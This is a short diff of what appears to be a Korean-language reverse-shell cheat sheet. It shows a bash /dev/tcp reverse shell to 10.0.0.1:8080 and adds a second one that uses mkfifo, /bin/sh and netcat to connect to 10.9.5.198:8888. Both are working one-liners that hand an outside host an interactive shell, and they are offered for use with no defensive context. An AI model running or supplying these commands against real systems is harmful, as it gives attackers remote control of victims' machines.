@@ -4,6 +4,8 @@
   * **명령어:**
     ```bash
     bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+
+    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.5.198 8888 >/tmp/f
     ```
 
 ### 2\. PERL (Practical Extraction and Report Language)
